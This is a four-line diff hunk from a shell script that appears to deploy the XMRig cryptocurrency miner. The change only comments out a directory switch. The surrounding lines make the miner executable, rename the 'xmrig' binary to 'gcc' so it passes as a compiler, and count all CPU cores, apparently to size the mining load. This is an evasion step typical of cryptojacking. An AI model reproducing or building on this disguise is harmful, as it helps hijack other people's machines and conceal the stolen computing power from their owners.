@@ -1,4 +1,4 @@
-cd xmrs
+#cd xmrs
 chmod +x xmrig
 mv xmrig gcc
 core=`nproc --all`
